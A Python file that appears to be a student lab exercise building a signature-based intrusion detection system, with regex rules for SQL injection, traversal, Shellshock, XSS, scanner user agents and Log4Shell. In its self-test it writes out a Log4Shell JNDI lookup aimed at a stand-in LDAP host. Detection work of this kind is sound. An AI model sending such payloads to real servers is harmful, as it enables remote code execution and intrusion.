import json
import re
from dataclasses import dataclass


@dataclass
class Rule:
    sid: int
    msg: str
    pattern: str
    severity: str


@dataclass
class Alert:
    sid: int
    msg: str
    severity: str
    matched_text: str
    packet_index: int


RULESET = [
    Rule(
        1000001,
        "SQL Injection - Tautology Attempt",
        r"'\s*OR\s*1\s*=\s*1",
        "critical",
    ),
    Rule(
        1000002,
        "SQL Injection - UNION SELECT Attempt",
        r"UNION\s+SELECT",
        "critical",
    ),
    Rule(
        1000003,
        "Directory Traversal Attempt",
        r"\.\./\.\./\.\./",
        "high",
    ),
    Rule(
        1000004,
        "Possible Shellshock Attempt",
        r"\(\)\s*\{.*;\s*\}",
        "critical",
    ),
    Rule(
        1000005,
        "Suspicious User-Agent - Scanner",
        r"(sqlmap|nikto|nmap)",
        "medium",
    ),
    Rule(
        1000006,
        "XSS Attempt - Script Tag",
        r"<script[^>]*>",
        "high",
    ),
    Rule(
        1000007,
        "Possible Log4Shell Attempt",
        r"\$\{jndi:",
        "critical",
    ),
]


class SignatureIDS:
    def __init__(self, ruleset):
        self.ruleset = ruleset
        self.compiled_rules = [
            (rule, re.compile(rule.pattern, re.IGNORECASE)) for rule in ruleset
        ]

    def inspect_packet(self, payload, packet_index):
        alerts = []

        for rule, compiled_pattern in self.compiled_rules:
            match = compiled_pattern.search(payload)

            if match:
                alerts.append(
                    Alert(
                        sid=rule.sid,
                        msg=rule.msg,
                        severity=rule.severity,
                        matched_text=match.group(0),
                        packet_index=packet_index,
                    )
                )

        return alerts

    def inspect_stream(self, payloads):
        all_alerts = []

        for i, payload in enumerate(payloads):
            all_alerts.extend(self.inspect_packet(payload, i))

        return all_alerts


def generate_alert_report(alerts):
    if not alerts:
        return "Тривог не зареєстровано."

    lines = [f"Зареєстровано {len(alerts)} тривог(и):", ""]

    severity_order = {
        "critical": 0,
        "high": 1,
        "medium": 2,
        "low": 3,
    }

    sorted_alerts = sorted(
        alerts,
        key=lambda alert: severity_order.get(alert.severity, 99),
    )

    for alert in sorted_alerts:
        lines.append(f"[{alert.severity.upper():8}] SID:{alert.sid} - {alert.msg}")
        lines.append(f"    Пакет №{alert.packet_index}, збіг: '{alert.matched_text}'")

    return "\n".join(lines)


def main():
    with open("variant_3.json", encoding="utf-8") as file:
        variant = json.load(file)

    traffic_stream = variant["traffic_stream"]
    ids = SignatureIDS(RULESET)

    print("=" * 65)
    print(f"SIGNATURE IDS - ВАРІАНТ №{variant['variant']}")
    print("=" * 65)

    print("\nПотік HTTP-запитів:")

    for i, payload in enumerate(traffic_stream):
        print(f"[{i}] {payload}")

    print("\n" + "=" * 65)
    print("РЕЗУЛЬТАТ РОБОТИ DETECTION ENGINE")
    print("=" * 65)

    alerts = ids.inspect_stream(traffic_stream)
    print(generate_alert_report(alerts))

    detected_packets = {alert.packet_index for alert in alerts}

    print("\n" + "=" * 65)
    print("СТАТИСТИКА")
    print("=" * 65)

    print(f"Усього запитів: {len(traffic_stream)}")
    print(f"Запитів з атаками: {len(detected_packets)}")
    print(f"Легітимних запитів: {len(traffic_stream) - len(detected_packets)}")

    expected = variant["expected_num_alerts"]

    print(f"\nОчікувана кількість тривог: {expected}")
    print(f"Фактична кількість тривог: {len(alerts)}")

    if len(alerts) == expected:
        print("[OK] Кількість тривог збігається!")
    else:
        print("[ERROR] Кількість тривог не збігається!")

    expected_types = set(variant["expected_attack_types"])

    signature_to_type = {
        1000001: "sqli_tautology",
        1000002: "sqli_union",
        1000003: "directory_traversal",
        1000005: "scanner_ua",
        1000006: "xss_script",
    }

    detected_types = {
        signature_to_type[alert.sid]
        for alert in alerts
        if alert.sid in signature_to_type
    }

    print(f"\nОчікувані типи атак: {sorted(expected_types)}")
    print(f"Виявлені типи атак: {sorted(detected_types)}")

    if detected_types == expected_types:
        print("[OK] Усі типи атак визначено правильно!")
    else:
        print("[ERROR] Типи атак не збігаються!")

    print("\nIDS: система фіксує атаки, але не блокує трафік.")
    print("IPS: система могла б відкидати шкідливі пакети до сервера.")

    # Тестування власної сигнатури
    print("\n" + "=" * 65)
    print("ТЕСТУВАННЯ ВЛАСНОЇ СИГНАТУРИ")
    print("=" * 65)

    test_payload = "GET / HTTP/1.1 User-Agent: ${jndi:ldap://example.com/a}"

    print(f"Тестовий запит: {test_payload}")

    test_alerts = ids.inspect_packet(test_payload, 0)

    print(generate_alert_report(test_alerts))

    if any(alert.sid == 1000007 for alert in test_alerts):
        print("[OK] Власна сигнатура успішно виявила загрозу!")
    else:
        print("[ERROR] Власна сигнатура не спрацювала!")


if __name__ == "__main__":
    main()
